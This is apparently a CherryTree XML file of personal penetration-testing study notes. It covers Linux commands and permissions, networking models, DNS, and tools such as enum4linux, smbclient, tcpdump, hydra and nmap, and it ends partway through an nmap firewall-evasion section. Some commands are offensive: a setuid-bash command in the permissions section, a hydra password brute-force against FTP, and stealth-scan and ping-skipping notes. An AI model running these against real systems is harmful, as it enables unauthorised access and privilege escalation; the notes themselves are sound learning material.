<?xml version="1.0" ?>
<cherrytree>
	<node custom_icon_id="0" foreground="" is_bold="True" name="MAIN" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1613777963.09" ts_lastsave="1614733857.53" unique_id="1">
		<rich_text>• Vulernability Searching
• Useful Commands/Linux Tools
• Linux file system
• OSI model</rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Vulnerability Searching" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1613777983.61" ts_lastsave="1613779151.37" unique_id="2">
			<rich_text>
</rich_text>
			<rich_text background="#ffff00000000" scale="h3" weight="heavy">ExploitDB</rich_text>
			<rich_text>
• </rich_text>
			<rich_text link="webs https://www.exploit-db.com/">https://www.exploit-db.com/</rich_text>
			<rich_text>
• can download vuln. for use
• searchsploit command line tool for ExploitDB

</rich_text>
			<rich_text background="#ffff00000000" scale="h3" weight="heavy">National Vulnerability Database</rich_text>
			<rich_text scale="h3"> </rich_text>
			<rich_text>
• </rich_text>
			<rich_text link="webs https://nvd.nist.gov/">https://nvd.nist.gov/</rich_text>
			<rich_text> 
• good for searching of Common Vulnerabilities and Exposure

</rich_text>
			<rich_text background="#ffff00000000" weight="heavy">Others</rich_text>
			<rich_text>
• CVE Mitre - </rich_text>
			<rich_text link="webs https://cve.mitre.org/">https://cve.mitre.org/</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Useful Commands (Linux)" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1613779763.95" ts_lastsave="1614971124.62" unique_id="3">
			<rich_text>• </rich_text>
			<rich_text background="#00000000ffff">man</rich_text>
			<rich_text> - manual for whatever tool in Linux ex: 
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">grep</rich_text>
			<rich_text> - pipe output (text) with this tool, output of man is filtered for version ex: 
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">scp</rich_text>
			<rich_text> - secure copy protocol, tool down/uploading files while ssh ex: 
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">ssh</rich_text>
			<rich_text> - remote login ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">su</rich_text>
			<rich_text> - switch user (leave blank for root) ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">&amp;&amp;</rich_text>
			<rich_text> - pipe commands, second executes if first succeeds, </rich_text>
			<rich_text background="#00000000ffff">;</rich_text>
			<rich_text> does excutes second parameter regardless ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">&amp;</rich_text>
			<rich_text> - command on left runs in background ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">&gt;&gt;</rich_text>
			<rich_text> - appends output to file, </rich_text>
			<rich_text background="#00000000ffff">&gt;</rich_text>
			<rich_text> inserts and if file already exists then it overwrites ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">export</rich_text>
			<rich_text> declare or change environment variables ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">rm</rich_text>
			<rich_text> - remove file or directory ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">mv</rich_text>
			<rich_text> - moves file to destination, also used to rename ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">cp</rich_text>
			<rich_text> - copy file from source to destination ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">mkdir</rich_text>
			<rich_text> - make directory ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">ln</rich_text>
			<rich_text> - creates hard link, duplicates file, changes made to copy reflect the original ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">ln -s </rich_text>
			<rich_text>- creates symbolic link, only creates a reference to the original ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">find</rich_text>
			<rich_text> - list files (user has access to) within given directory ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">sudo</rich_text>
			<rich_text> - run command as root  (must have current user's password and must have permission ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">apt</rich_text>
			<rich_text> - Advanced Package Tool, use tool to install/manage packages
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>


</rich_text>
			<rich_text background="#ffff00000000" scale="h1">Users</rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">adduser</rich_text>
			<rich_text> - create user (must run as root) ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">addgroup</rich_text>
			<rich_text> -create group (must run as root) ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">usermod</rich_text>
			<rich_text> - add user to group(s) (usermod -a -G [groups seperated by commas] &lt;user&gt;) ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>


</rich_text>
			<rich_text background="#ffff00000000" scale="h1">Processes</rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">ps</rich_text>
			<rich_text> - show list of running processes ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">kill</rich_text>
			<rich_text> - terminate process with asscociated pid</rich_text>
			<rich_text background="#000000000000"> </rich_text>
			<rich_text>
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>


</rich_text>
			<rich_text background="#ffff00000000" scale="h1">Misc.</rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">#!/bin/bash</rich_text>
			<rich_text> - shebang file with this header is a bash script, must have .sh extension to be a bash script if no shebang ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">Relative paths</rich_text>
			<rich_text>: 
   ◇ . (current dir) 
   ◇ .. (previous dir)
   ◇ ~(home dir)
• </rich_text>
			<rich_text background="#00000000ffff">$ </rich_text>
			<rich_text>denotes environment variables (variables used by processes) ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
</rich_text>
			<rich_text background="#ffffffff0000" foreground="#000000000000" link="node 20" scale="h2">NFS</rich_text>
			<rich_text scale="h2"> </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">mount</rich_text>
			<rich_text> - mount NFS shares
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• </rich_text>
			<rich_text background="#00000000ffff">showmount</rich_text>
			<rich_text> - show mount information for an NFS server
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>


</rich_text>
			<rich_text background="#ffff00000000" scale="h1">PERMISSIONS</rich_text>
			<rich_text justification="left" scale="h1"></rich_text>
			<rich_text scale="h1"> (see </rich_text>
			<rich_text link="node 4" scale="h1">Linux Files</rich_text>
			<rich_text scale="h1"> tab)</rich_text>
			<rich_text> 
• </rich_text>
			<rich_text background="#00000000ffff">chown</rich_text>
			<rich_text> - change ownership, use to modify owner and group of file or dir ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
•  </rich_text>
			<rich_text background="#00000000ffff">chmod</rich_text>
			<rich_text> - change owner, group and everyone else permissions ex:
   ◇ </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>

</rich_text>
			<codebox char_offset="52" frame_height="20" frame_width="300" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">man ssh</codebox>
			<codebox char_offset="146" frame_height="20" frame_width="300" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">man ssh | grep ‘version’</codebox>
			<codebox char_offset="224" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">scp -r user@example.com:/path/to/source /path/to/dest</codebox>
			<codebox char_offset="256" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">ssh username@hostname_or_ip</codebox>
			<codebox char_offset="309" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">su #[optional user]</codebox>
			<codebox char_offset="420" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">ls &amp;&amp; echo hello</codebox>
			<codebox char_offset="472" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">sleep 5 &amp; ls</codebox>
			<codebox char_offset="570" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">echo hello &gt;&gt; text.txt</codebox>
			<codebox char_offset="630" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">export path=/home/Desktop</codebox>
			<codebox char_offset="673" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">rm -r /directory #deletes directory and all files within</codebox>
			<codebox char_offset="738" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">mv file /home/Desktop</codebox>
			<codebox char_offset="793" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">cp file /home/Desktop</codebox>
			<codebox char_offset="829" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">mkdir myDir</codebox>
			<codebox char_offset="925" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">ln file newfile</codebox>
			<codebox char_offset="1010" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">ln -s file newfile</codebox>
			<codebox char_offset="1085" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">find /tmp/ -user root #list all files within /tmp owned by root</codebox>
			<codebox char_offset="1186" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">sudo chmod 777 file #chmod executed as root</codebox>
			<codebox char_offset="1260" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">apt install package</codebox>
			<codebox char_offset="1322" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">sudo adduser newuser</codebox>
			<codebox char_offset="1377" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">sudo addgroup newpplgroup</codebox>
			<codebox char_offset="1473" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">usermod -a -G group1, newpplgroup, group2 newuser</codebox>
			<codebox char_offset="1534" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">ps -ef</codebox>
			<codebox char_offset="1590" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">kill 333</codebox>
			<codebox char_offset="1731" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">./helloWorldScript</codebox>
			<codebox char_offset="1738" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">bash helloWorldScript.sh</codebox>
			<codebox char_offset="1894" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">echo $PATH</codebox>
			<encoded_png anchor="nfs" char_offset="1900">anchor</encoded_png>
			<codebox char_offset="1934" frame_height="20" frame_width="550" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">sudo mount -t nfs 127.0.0.1:share /tmp/mount/ -nolock</codebox>
			<codebox char_offset="1996" frame_height="20" frame_width="550" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">showmount -e 127.0.0.1 #get export list</codebox>
			<encoded_png anchor="perm" char_offset="2011">anchor</encoded_png>
			<codebox char_offset="2118" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">chown root:root bash #</codebox>
			<codebox char_offset="2190" frame_height="30" frame_width="525" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">chmod 777 file; sudo chmod +xs bash #last one: execute and setuid for everyone</codebox>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Linux Files" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1613785562.03" ts_lastsave="1614919694.65" unique_id="4">
			<rich_text justification="left"></rich_text>
			<rich_text>
</rich_text>
			<rich_text scale="h3">FORMAT: Owner, Group, [everyone else] → 341 = owner can exe and write to, group can read file, everyone else can execute</rich_text>
			<rich_text>

</rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
</rich_text>
			<rich_text link="node 3 perm" scale="h1">see useful commands for permissions</rich_text>
			<rich_text>
• setUID bit ex: </rich_text>
			<rich_text background="#000000000000"> </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• setGID bit ex: </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• set sticky bit ex:
    </rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text> or</rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• add permission ex:
</rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
• remove permission ex:
</rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>

Linux Directories
/tmp - temporary dir. files removed on restart
</rich_text>
			<table char_offset="0" col_max="300" col_min="300">
				<row>
					<cell>1</cell>
					<cell>file can be executed</cell>
				</row>
				<row>
					<cell>2</cell>
					<cell>file can be written to</cell>
				</row>
				<row>
					<cell>3</cell>
					<cell>can execute and write to</cell>
				</row>
				<row>
					<cell>4</cell>
					<cell>can read file</cell>
				</row>
				<row>
					<cell>5</cell>
					<cell>can read and execute</cell>
				</row>
				<row>
					<cell>6</cell>
					<cell>can write and read file</cell>
				</row>
				<row>
					<cell>7</cell>
					<cell>can read, write and execute file</cell>
				</row>
				<row>
					<cell>Digit</cell>
					<cell>Meaning</cell>
				</row>
			</table>
			<table char_offset="124" col_max="300" col_min="300">
				<row>
					<cell>r</cell>
					<cell>read</cell>
				</row>
				<row>
					<cell>w</cell>
					<cell>write</cell>
				</row>
				<row>
					<cell>x</cell>
					<cell>execute</cell>
				</row>
				<row>
					<cell>s</cell>
					<cell>sets either set User ID or group, allows file to run with privileges of user or group (4 = user, 2 = group, see example below)</cell>
				</row>
				<row>
					<cell>t</cell>
					<cell>sticky bit set, only owner can delete file/dir (1 = sticky bit)</cell>
				</row>
				<row>
					<cell>+</cell>
					<cell>add permission to file</cell>
				</row>
				<row>
					<cell>-</cell>
					<cell>remove permission</cell>
				</row>
				<row>
					<cell>Letter</cell>
					<cell>Meaning</cell>
				</row>
			</table>
			<codebox char_offset="180" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">chmod 4755 file #the four in front</codebox>
			<codebox char_offset="199" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">chmod 2755 file #the two in front</codebox>
			<codebox char_offset="226" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">chmod 1777 directory #the one in front</codebox>
			<codebox char_offset="230" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">chmod +t directory</codebox>
			<codebox char_offset="253" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">chmod a+x file</codebox>
			<codebox char_offset="279" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">chmod g-w #removes write permission from group</codebox>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Networking" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1613961219.07" ts_lastsave="1614915223.41" unique_id="6">
			<rich_text link="node 5">• OSI Model</rich_text>
			<rich_text>
• </rich_text>
			<rich_text link="node 7">TCP/IP</rich_text>
			<rich_text>
• </rich_text>
			<rich_text link="node 8">Tools</rich_text>
			<rich_text>
• </rich_text>
			<rich_text link="node 14">IP address/Notation</rich_text>
			<rich_text>

</rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text> </rich_text>
			<rich_text background="#ffff00000000" scale="h1">Resolving DNS query </rich_text>
			<rich_text link="node 11 dig" scale="h1">(see tool dig)</rich_text>
			<rich_text>
1. Enter URL into browser
2. Machine checks local cache if IP is already known, if not in cache then next step
3. Router sends DNS query to recursive server (these are known to router) to resolve URL name
4. Recursive servers store IP of popular sites, if still not found next step
5. Pass request down to root name server (13 total worldwide)
6. Root name server passes down request to appropiate Top-Level Domain servers (via extensions like .com or .org)
7. TLD passes request to appropiate Authoritative name server where DNS records are stored directly
8. When found, Authoritative name server returns requested info</rich_text>
			<encoded_png anchor="dns" char_offset="52">anchor</encoded_png>
			<node custom_icon_id="0" foreground="" is_bold="False" name="OSI" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1613959297.82" ts_lastsave="1613962482.31" unique_id="5">
				<rich_text justification="left"></rich_text>
				<rich_text>

</rich_text>
				<rich_text background="#00000000ffff" scale="h1">Encapsulation</rich_text>
				<rich_text scale="h1"> - data being sent traverses the 7 layers starting from Application to Physical. Each layer adds its appropiate header to the data. Example: layer 3 adds the IP header.</rich_text>
				<rich_text>

</rich_text>
				<rich_text background="#00000000ffff" scale="h1">De-encapsulation</rich_text>
				<rich_text scale="h1"> - when data is received each header is removed starting from physical to application, the reverse process of above</rich_text>
				<table char_offset="0" col_max="300" col_min="300">
					<row>
						<cell>7 Application</cell>
						<cell>applications users directly interact with</cell>
					</row>
					<row>
						<cell>6 Presentation</cell>
						<cell>handles data from app later, standardizes data and encrytion/compression if applicable</cell>
					</row>
					<row>
						<cell>5 Session</cell>
						<cell>responsible for establishing and maintaining session to receiver of data from presentation layer</cell>
					</row>
					<row>
						<cell>4 Transportation</cell>
						<cell>protocol to transmit data is choosen (two most common: TCP, UDP)</cell>
					</row>
					<row>
						<cell>3 Network</cell>
						<cell>Logical address (IP) used to determine route of transmission</cell>
					</row>
					<row>
						<cell>2 Data Link</cell>
						<cell>Focuses on Physical address (MAC) to deliver data to proper recipient</cell>
					</row>
					<row>
						<cell>1 Physical</cell>
						<cell>Hardware of the computer</cell>
					</row>
					<row>
						<cell>Layer</cell>
						<cell>Description</cell>
					</row>
				</table>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="TCP/IP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1613962534.78" ts_lastsave="1614735896.14" unique_id="7">
				<rich_text justification="left"></rich_text>
				<rich_text>
TCP/IP layers perform one or more of the actions of the corresponding OSI layers

</rich_text>
				<rich_text background="#00000000ffff" scale="h3">Transmission Control Protocol</rich_text>
				<rich_text scale="h3">, control flow of data between two endpoints</rich_text>
				<rich_text>
</rich_text>
				<rich_text background="#00000000ffff" scale="h3">Internet Protocol</rich_text>
				<rich_text scale="h3">, how packets are addressed sent</rich_text>
				<rich_text>
    TCP/IP suite

</rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text background="#ffff00000000">TCP</rich_text>
				<rich_text> is conncection based. Threeway handshake is conducted to establish connection (preserves state unlike UDP)
• SYN (sender)
• SYN/ACK (receiver acknowledges)
• ACK (handshake complete, session established)</rich_text>
				<table char_offset="0" col_max="300" col_min="300">
					<row>
						<cell>Application</cell>
						<cell>Application, Presentation, Session</cell>
					</row>
					<row>
						<cell>Transport</cell>
						<cell>Transport</cell>
					</row>
					<row>
						<cell>Internet</cell>
						<cell>Network</cell>
					</row>
					<row>
						<cell>Network Interface</cell>
						<cell>Data Link, Physical</cell>
					</row>
					<row>
						<cell>TCP/IP</cell>
						<cell>OSI</cell>
					</row>
				</table>
				<encoded_png anchor="TCP/IP" char_offset="226">anchor</encoded_png>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Tools" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614022574.09" ts_lastsave="1615580672.72" unique_id="8">
				<rich_text>• </rich_text>
				<rich_text link="node 12">Nmap</rich_text>
				<rich_text>
• </rich_text>
				<rich_text link="node 9">Metasploit</rich_text>
				<rich_text>
• Burp Suite
• curl
• misc
   ◇ </rich_text>
				<rich_text link="node 11 trace">Traceroute</rich_text>
				<rich_text>
   ◇ </rich_text>
				<rich_text link="node 11 whois">whois</rich_text>
				<rich_text>
   ◇ </rich_text>
				<rich_text link="node 11 dig">dig</rich_text>
				<rich_text>
   ◇ </rich_text>
				<rich_text link="node 11 tcpdump">tcpdum</rich_text>
				<rich_text>p</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Misc. tools" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614025164.67" ts_lastsave="1614914656.81" unique_id="11">
					<rich_text>•</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>  </rich_text>
					<rich_text background="#00000000ffff">traceroute</rich_text>
					<rich_text> - view path between user and destination (operates over UDP for Linux)  ex:
   ◇ Linux: </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
   ◇ windows: </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

• </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text> </rich_text>
					<rich_text background="#00000000ffff">whois</rich_text>
					<rich_text> - allows to pull registration information on domain name ex:
   ◇ </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text> 

• </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text> </rich_text>
					<rich_text background="#00000000ffff">dig</rich_text>
					<rich_text> - manually query recursive DNS servers for information on a domain (</rich_text>
					<rich_text link="node 6 dns">see resolving DNS query</rich_text>
					<rich_text>)
   ◇ TTL is measured in seconds
   ◇ default return record is A record
   ◇ </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

• </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text> </rich_text>
					<rich_text background="#00000000ffff">enum4linux</rich_text>
					<rich_text> - enumerate users, groups, shares and more
   ◇ </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

• </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text background="#00000000ffff">smbclient</rich_text>
					<rich_text> - client to access resources on SMB server
   ◇ </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
   ◇ </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h3">•</rich_text>
					<rich_text justification="left" scale="h3"></rich_text>
					<rich_text scale="h3"> </rich_text>
					<rich_text background="#00000000ffff" scale="h3">tcpdump</rich_text>
					<rich_text scale="h3"> - monitor network traffic on a interface</rich_text>
					<rich_text>
   ◇ </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<rich_text scale="h3">• </rich_text>
					<rich_text justification="left" scale="h3"></rich_text>
					<rich_text background="#00000000ffff" scale="h3">hydra</rich_text>
					<rich_text scale="h3"> - brute force password cracking tool</rich_text>
					<rich_text>
   ◇ </rich_text>
					<rich_text justification="left"></rich_text>
					<encoded_png anchor="trace" char_offset="1">anchor</encoded_png>
					<codebox char_offset="103" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">traceroute google.com</codebox>
					<codebox char_offset="119" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">tracert google.com</codebox>
					<encoded_png anchor="whois" char_offset="124">anchor</encoded_png>
					<codebox char_offset="198" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">whois google.com</codebox>
					<encoded_png anchor="dig" char_offset="204">anchor</encoded_png>
					<codebox char_offset="379" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">dig google.com</codebox>
					<encoded_png anchor="enum" char_offset="384">anchor</encoded_png>
					<codebox char_offset="445" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">enum4linux -A 127.0.0.1 #enumerate all options</codebox>
					<encoded_png anchor="smbclient" char_offset="450">anchor</encoded_png>
					<codebox char_offset="509" frame_height="20" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">smbclient //127.0.0.1/profiles #connect to profiles share on 127.0.0.1</codebox>
					<codebox char_offset="516" frame_height="40" frame_width="500" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">get &quot;Example Information.txt&quot; #remember double quotes for this kind of file name</codebox>
					<encoded_png anchor="tpcdump" char_offset="520">anchor</encoded_png>
					<codebox char_offset="576" frame_height="20" frame_width="550" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">sudo tcpdump ip proto \\icmp -i tun0 #listen for icmp traffic on tun0</codebox>
					<encoded_png anchor="hydra" char_offset="581">anchor</encoded_png>
					<codebox char_offset="630" frame_height="20" frame_width="550" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">hydra -t 4 -l mike -P /usr/sharewordlists/rockyou.txt -vV 127.0.0.1 ftp</codebox>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Nmap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1614117521.6" ts_lastsave="1614736914.88" unique_id="12">
					<rich_text background="#ffff00000000" scale="h1">Scripts</rich_text>
					<rich_text>
• safe, does not affect target
• intrusive, likely to affect target
• vuln, scan for vulnerabilities
• exploit, attempt to exploit vulnerability
• auth, attempt to bypass authentication (eg anonymous login FTP)
• brute, attempt to bruteforce credentials
• discovery, query running services for further info
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
To run specific script
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
if scripts have argument to pass
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

• search for scripts in /usr/share/nmap/scripts or nmap website
   ◇ search through /usr/share/nmap/scripts/script.db 

</rich_text>
					<rich_text background="#ffff00000000" scale="h1">Scan types</rich_text>
					<rich_text>
• TCP Connect -sT
• SYN -sS
• UDP
• NULL, FIN and Xmas -sN/-sF/-sX
• ICMP (Network scanning) -sn

</rich_text>
					<rich_text background="#00000000ffff">TCP Connect</rich_text>
					<rich_text>
• default scan if ran w/o sudo
• Recall </rich_text>
					<rich_text link="node 7 TCP/IP">three way handshake</rich_text>
					<rich_text>, if complete then port is open
• If target machine port is closed then RST flag is response ex: SYN → RST (TCP connection is rejected)
   ◇ RST flag is sent by target machine or firewall is dropping all incoming requests and returns RST flag on behalf of target

</rich_text>
					<rich_text background="#00000000ffff">SYN</rich_text>
					<rich_text>
• default scan if ran w/ sudo
• Like TCP Connect but responds w/ RST flag to SYN/ACK to avoid detection by logging successful TCP connections and older Intrusion Detection Systems
• aka Stealth Scan, Half-open scan
• faster than TCP connect scan

</rich_text>
					<rich_text background="#00000000ffff">UDP</rich_text>
					<rich_text>
• because UDP is stateless, it is harder to determine status of port, two cases:
   ◇ case 0: port is open or filtered by firewall, then no response is sent port is marked open | filtered
   ◇ case 1: port is closed, a closed port will solicit ICMP ping response (unreachable) marking port closed
• UDP scans are incredibly slow, should scan ports known to host UDP
   </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

</rich_text>
					<rich_text background="#00000000ffff">NULL/FIN/XMAS </rich_text>
					<rich_text>
• these scans are less commonly used
• NULL:  sends TCP request w/ no flags set, if port closed then response is RST
• FIN: TCP request with FIN flag set, another stealthy option to determine firewall rules, closed port responds w/ RST
• XMAS: PSH, URG, FIN flags set for malformed packet, closed ports responds w/ RST

</rich_text>
					<rich_text background="#ffff00000000" scale="h1">Firewall evasion</rich_text>
					<rich_text>
• nmap uses icmp ping to determine if machine is active, firewalls can disable ping requests
   ◇ skip ping portion to continue scan -Pn, adds time
   ◇ </rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
</rich_text>
